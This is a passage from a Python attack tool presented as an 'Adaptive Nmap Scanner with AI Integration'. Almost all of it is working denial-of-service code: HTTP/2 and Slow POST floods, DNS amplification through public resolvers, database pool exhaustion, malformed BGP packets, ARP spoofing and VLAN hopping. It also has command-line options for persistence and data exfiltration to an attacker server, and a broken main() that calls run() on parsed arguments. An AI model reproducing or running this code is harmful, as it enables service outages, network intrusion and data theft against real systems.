                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            # Clean up remaining files
            for file in os.listdir():
                if file.startswith("dos_file_"):
                    try:
                        os.remove(file)
                    except:
                        pass
                        
            return True
            
        except Exception as e:
            self.logger.error(f"Error in disk exhaustion attack: {e}")
            return False
            
    def _http2_dos_attack(self, target):
        """Perform an HTTP/2 DoS attack using multiple streams."""
        try:
            import h2.connection
            import h2.events
            import socket
            import threading
            import time
            
            def http2_attack():
                while time.time() < end_time:
                    try:
                        # Create HTTP/2 connection
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target, 443))
                        sock = ssl.wrap_socket(sock, server_hostname=target)
                        
                        conn = h2.connection.H2Connection()
                        conn.update_settings({
                            h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 1000,
                            h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 65535
                        })
                        
                        # Send multiple streams
                        for i in range(100):
                            stream_id = conn.get_next_available_stream_id()
                            conn.send_headers(
                                stream_id,
                                [(':method', 'GET'),
                                 (':path', '/'),
                                 (':scheme', 'https'),
                                 (':authority', target),
                                 ('user-agent', 'Mozilla/5.0')],
                                end_stream=False
                            )
                            conn.send_data(stream_id, b'x' * 65535, end_stream=True)
                            
                        sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=http2_attack)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in HTTP/2 DoS attack: {e}")
            return False
            
    def _dns_amplification_attack(self, target):
        """Perform a DNS amplification attack."""
        try:
            import socket
            import threading
            import time
            
            def dns_attack():
                while time.time() < end_time:
                    try:
                        # Create DNS query for ANY record
                        query = self.dos_payload.encode() if self.dos_payload else b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01'
                        
                        # Send to multiple DNS servers
                        for dns_server in ['8.8.8.8', '8.8.4.4', '1.1.1.1']:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.sendto(query, (dns_server, 53))
                            sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=dns_attack)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in DNS amplification attack: {e}")
            return False
            
    def _slowpost_attack(self, target):
        """Perform a Slow POST attack."""
        try:
            import socket
            import threading
            import time
            
            def slowpost():
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target, 80))
                        
                        # Send headers
                        headers = (
                            "POST / HTTP/1.1\r\n"
                            f"Host: {target}\r\n"
                            "Content-Type: application/x-www-form-urlencoded\r\n"
                            "Content-Length: 1000000\r\n"
                            "\r\n"
                        )
                        sock.send(headers.encode())
                        
                        # Slowly send data
                        while time.time() < end_time:
                            sock.send(b'x' * 100)
                            time.sleep(0.1)
                            
                        sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=slowpost)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in Slow POST attack: {e}")
            return False
            
    def _dbpool_exhaustion_attack(self, target):
        """Perform a database connection pool exhaustion attack."""
        try:
            import mysql.connector
            import threading
            import time
            
            def db_attack():
                while time.time() < end_time:
                    try:
                        # Try to establish database connections
                        conn = mysql.connector.connect(
                            host=target,
                            user="root",
                            password="",
                            connection_timeout=1
                        )
                        time.sleep(0.1)  # Keep connection open
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=db_attack)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in database pool exhaustion attack: {e}")
            return False
            
    def _cache_poisoning_attack(self, target):
        """Perform a cache poisoning attack."""
        try:
            import socket
            import threading
            import time
            
            def cache_attack():
                while time.time() < end_time:
                    try:
                        # Send malformed cache headers
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target, 80))
                        
                        headers = (
                            "GET / HTTP/1.1\r\n"
                            f"Host: {target}\r\n"
                            "Cache-Control: no-cache, no-store, must-revalidate\r\n"
                            "Pragma: no-cache\r\n"
                            "Expires: 0\r\n"
                            "If-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT\r\n"
                            "If-None-Match: W/\"0-0\"\r\n"
                            "\r\n"
                        )
                        sock.send(headers.encode())
                        sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=cache_attack)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in cache poisoning attack: {e}")
            return False
            
    def _bgp_route_poisoning_attack(self, target):
        """Perform a BGP route poisoning attack."""
        try:
            import socket
            import threading
            import time
            
            def bgp_attack():
                while time.time() < end_time:
                    try:
                        # Send malformed BGP updates
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target, 179))  # BGP port
                        
                        # Send malformed BGP packet
                        bgp_packet = (
                            b'\xff' * 16 +  # BGP marker
                            b'\x00' * 2 +   # Length
                            b'\x01' +        # Type (OPEN)
                            b'\x04' +        # Version
                            b'\x00' * 2 +    # AS number
                            b'\x00' * 2 +    # Hold time
                            b'\x00' +        # BGP identifier
                            b'\x00'          # Optional parameters length
                        )
                        sock.send(bgp_packet)
                        sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=bgp_attack)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in BGP route poisoning attack: {e}")
            return False
            
    def _arp_cache_poisoning_attack(self, target):
        """Perform an ARP cache poisoning attack."""
        try:
            import scapy.all as scapy
            import threading
            import time
            
            def arp_attack():
                while time.time() < end_time:
                    try:
                        # Create ARP packet
                        arp = scapy.ARP(
                            op=2,  # ARP reply
                            pdst=target,
                            hwdst="ff:ff:ff:ff:ff:ff",
                            psrc="192.168.1.1",  # Spoofed IP
                            hwsrc="00:11:22:33:44:55"  # Spoofed MAC
                        )
                        scapy.send(arp)
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=arp_attack)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in ARP cache poisoning attack: {e}")
            return False
            
    def _vlan_hopping_attack(self, target):
        """Perform a VLAN hopping attack."""
        try:
            import scapy.all as scapy
            import threading
            import time
            
            def vlan_attack():
                while time.time() < end_time:
                    try:
                        # Create double-tagged VLAN packet
                        packet = (
                            scapy.Ether() /
                            scapy.Dot1Q(vlan=1) /  # Outer VLAN
                            scapy.Dot1Q(vlan=2) /  # Inner VLAN
                            scapy.IP(dst=target) /
                            scapy.TCP(dport=80)
                        )
                        scapy.send(packet)
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=vlan_attack)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in VLAN hopping attack: {e}")
            return False

def parse_arguments():
    parser = argparse.ArgumentParser(description='Adaptive Nmap Scanner with AI Integration')
    
    # Basic arguments
    parser.add_argument('target', help='Target host or network to scan')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    
    # Red team arguments
    parser.add_argument('--red-team', action='store_true', help='Enable full red team mode')
    parser.add_argument('--persistence', action='store_true', help='Attempt to establish persistent access')
    parser.add_argument('--exfil', action='store_true', help='Enable data exfiltration')
    parser.add_argument('--exfil-method', choices=['dns', 'http', 'icmp', 'smb', 'ftp'], help='Data exfiltration method')
    parser.add_argument('--exfil-data', choices=['passwords', 'configs', 'all'], help='Data to exfiltrate')
    parser.add_argument('--exfil-server', help='Server to exfiltrate data to')
    
    # DoS arguments
    parser.add_argument('--dos', action='store_true', help='Enable DoS attack mode')
    parser.add_argument('--dos-method', choices=[
        'udp', 'icmp', 'slowloris', 'syn', 'http',
        'cpu', 'memory', 'disk',
        'http2', 'dns', 'slowpost',
        'dbpool', 'cache',
        'bgp', 'arp', 'vlan'
    ], help='DoS attack method')
    parser.add_argument('--dos-threads', type=int, default=10, help='Number of attack threads')
    parser.add_argument('--dos-duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('--dos-payload', help='Custom payload for DoS attack')
    
    # Other arguments
    parser.add_argument('--output', help='Output file for scan results')
    parser.add_argument('--format', choices=['text', 'xml', 'json'], default='text', help='Output format')
    
    return parser.parse_args()

def main():
    """Main entry point."""
    try:
        # Parse arguments and get scanner
        scanner = parse_arguments()
        
        # Run the scanner
        scanner.run()
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main() 